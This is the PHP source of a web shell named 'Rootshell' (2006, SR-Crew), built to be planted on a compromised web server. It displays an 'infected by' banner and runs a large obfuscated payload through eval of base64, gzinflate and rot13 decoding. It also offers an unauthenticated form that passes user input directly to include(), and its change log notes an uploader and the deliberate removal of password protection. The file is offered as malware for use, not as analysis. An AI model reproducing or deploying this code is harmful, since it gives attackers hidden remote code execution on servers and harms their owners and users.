<!--
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/*  ................jdWMMMMMNk&,...JjdMMMHMMHA+................ */
/*  .^.^.^.^.^.^..JdMMMBC:vHMMNI..`dMMM8C`ZMMMNs...^^.^^.^^.^^. */
/*  ..^.^..^.....dMMMBC`....dHNn...dMNI....`vMMMNy.........^... */
/*  .....^..?XMMMMMBC!..dMM@MMMMMMM#MMH@MNZ,^!OMMHMMNk!..^...^. */
/*  ^^.^..^.`??????!`JdN0??!??1OUUVT??????XQy!`??????!`..^..^.^ */
/*  ..^..^.....^..^..?WN0`` `  +llz:`    .dHR:..^.......^..^... */
/*  ...^..^.^.^..^...`?UXQQQQQeyltOOagQQQeZVz`..^.^^..^..^..^.. */
/*  ^.^..^..^..^..^.^..`zWMMMMH0llOXHMMMM9C`..^.....^..^..^..^. */
/*  ..^..^...^..+....^...`zHHWAwtltwAXH8I....^...?+....^...^..^ */
/*  ...^..^...JdMk&...^.^..^zHNkAAwWMHc...^.....jWNk+....^..^.. */
/*  ^.^..^..JdMMMMNHo....^..jHMMMMMMMHl.^..^..jWMMMMNk+...^..^. */
/*  .^....jdNMM9+4MMNmo...?+zZV7???1wZO+.^..ddMMM6?WMMNmc..^..^ */
/*  ^.^.jqNMM9C!^??UMMNmmmkOltOz+++zltlOzjQQNMMY?!`??WMNNmc^.^. */
/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */
/*  OUUUUU6:.jgWNNmx,`OUWHHHHHSI..?wWHHHHHW9C!.udMNHAx.?XUUUU9C */
/*  .......+dWMMMMMNm+,`+ltltlzz??+1lltltv+^.jdMMMMMMHA+......^ */
/*  ..^..JdMMMMC`vMMMNkJuAAAAAy+...+uAAAAA&JdMMMBC`dMMMHs....^. */
/*  ....dMMMMC``.``zHMMMMMMMMMMS==zXMMMMMMMMMM8v``.`?ZMMMNs.... */
/*  dMMMMMBC!`.....`!?????1OVVCz^^`+OVVC??????!`....^`?vMMMMMNk */
/*  ??????!`....^.........?ztlOz+++zlltz!........^.....???????! */
/*  .....^.^^.^..^.^^...uQQHkwz+!!!+zwWHmmo...^.^.^^.^..^....^. */
/*  ^^.^.....^.^..^...ugHMMMNkz1++++zXMMMMHmx..^....^.^..^.^..^ */
/*  ..^.^.^.....^...jdHMMMMM9C???????wWMMMMMHn+...^....^..^..^. */
/*  ^....^.^.^....JdMMMMMMHIz+.......?zdHMMMMMNA....^..^...^..^ */
/*  .^.^....^...JdMMMMMMHZttOz1111111zlttwWMMMMMNn..^.^..^..^.. */
/*  ..^.^.^....dNMMMMMWOOtllz!^^^^^^^+1lttOZWMMMMMNA,....^..^.. */
/*  ^....^..?dNMMMMMC?1ltllllzzzzzzzzzlllltlz?XMMMMNNk+^..^..^. */
/*  .^.^..+dNMM8T77?!`+lllz!!!!!!!!!!!!+1tll+`??777HMNHm;..^..^ */
/*  ..^..^jHMMNS`..^.`+ltlz+++++++++++++ztll+`....`dMMMHl.^..^. */
/*  ....^.jHMMNS`^...`+ltlz+++++++++++++zltl+`^.^.`dMMMHl..^..^ */
/*  ^^.^..jHMMNS`.^.^`+tllz+...........?+ltl+`.^..`dMMMHl...^.. */
/*  ..^..^jHMMM6`..^.`+lltltltlz111zltlltlll+`...^`dMMMHl.^..^. */
/*  ....^.jHNC``.^...`+zltlltlz+^^.+zltlltzz+`..^.^`?dMHl..^..^ */
/*  .^.^..jHNI....^..^``+zltltlzzzzzltltlv!``.^...^..dMHc....^. */
/*  ^...jdNMMNmo...^...^`?+ztlltllltlltz!``..^.^...dqNMMNmc.^.. */
/*  .^.`?7TTTTC!`..^.....^`?!!!!!!!!!!!!`..^....^.`?7TTTTC!..^. */
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/*
/*    We should take care some kind of history, i will add here to keep a trace of changes (who made it).
/*    Also I think we should increase the last version number by 1 if you make some changes.
/*
/*    CHANGES / VERSION HISTORY:
/*    ====================================================================================
/*    Version        Nick            Description
/*    - - - - - - - - - - - - - - - - - - - - - - - - - - -
/*    0.3.1          666            added an ascii bug :)
/*    0.3.1          666            password protection
/*    0.3.1          666            GET and POST changes
/*    0.3.2          666            coded a new uploader
/*    0.3.2          666            new password protection
/*    0.3.3          666            added a lot of comments :)
/*    0.3.3          666            added "Server Info"
/*    1.0.0          666            added "File Inclusion"
/*    1.0.0          666            removed password protection (nobody needs it...)
/*    1.0.0          666            added "Files & Directories"
/*
/*
-->
<?
//
// Default Changes
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

$owner        = "Hacker";                                                       // Insert your nick
$version      = "1.0.0";                                                        // The version    

//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
//
?>

<body link="#000000" vlink="#000000" alink="#000000" bgcolor="#FFFFD5">
<style type="text/css">
body{
cursor:crosshair 
}
</style>
<div align="center" style="width: 100%; height: 100">
<pre width="100%" align="center"><strong> ____             _         ____  _          _ _
|  _ \ ___   ___ | |_      / ___|| |__   ___| | |
| |_) / _ \ / _ \| __|     \___ \| '_ \ / _ \ | |
|  _ < (_) | (_) | |_   _   ___) | | | |  __/ | |
|_| \_\___/ \___/ \__| (_) |____/|_| |_|\___|_|_|</pre>
</div></strong>
<b><u><center><?php echo "This server has been infected by $owner"; ?></center></u></b>
<hr color="#000000" size="2,5">

<div align="center">
  <center>
  <p>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>
  
</p>
      </form>
      <p align="center">
      <br>
        &nbsp;<p align="center">&nbsp;</td>
      <td width="51%" height="232">
      <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
      Include 
      something :)<br>
      <br>
&nbsp;</font><form method="POST">
       <p align="center">
        <input type="text" name="incl" size="20"><br>
        <br>
        <input type="submit" value="Include!" name="inc"></p>
      </form>
      <?php @$output = include($_POST['incl']); ?>
      </td>
    </tr>
  </table>
  </center>
</div>
<br /></p>
<div align="center">
  <center>
  <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
    <tr>
      <td width="100%" bgcolor="#FCFEBA" height="20">
      <p align="center"><font face="Verdana" size="2">Rootshell v<?php echo "$version" ?>  2006 by <a style="text-decoration: none" target="_blank" href="http://www.SR-Crew.de.tt">SR-Crew</a> </font></td>
    </tr>
  </table>
  </center>
</div> 
